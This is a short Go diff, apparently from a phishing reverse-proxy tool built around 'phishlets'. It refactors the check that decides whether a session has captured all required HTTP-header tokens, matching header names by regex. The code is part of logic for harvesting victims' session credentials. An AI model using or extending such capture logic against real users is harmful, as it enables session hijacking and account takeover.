@@ -76,7 +76,7 @@ func (s *Session) HasRequiredTokens(def *Phishlet) bool {
 				return false
 			}
 		case TokenTypeHTTPHeader:
-			if rule.Name != nil && s.HTTPTokens[rule.Name.String()] == "" {
+			if rule.Name != nil && !s.hasHTTPToken(rule) {
 				return false
 			}
 		}
@@ -93,6 +93,18 @@ func (s *Session) hasCookieToken(rule TokenRule) bool {
 			if rule.Name != nil && rule.Name.MatchString(name) {
 				return true
 			}
+		}
+	}
+	return false
+}
+
+func (s *Session) hasHTTPToken(rule TokenRule) bool {
+	if rule.Name == nil {
+		return false
+	}
+	for name, value := range s.HTTPTokens {
+		if rule.Name.MatchString(name) && value != "" {
+			return true
 		}
 	}
 	return false
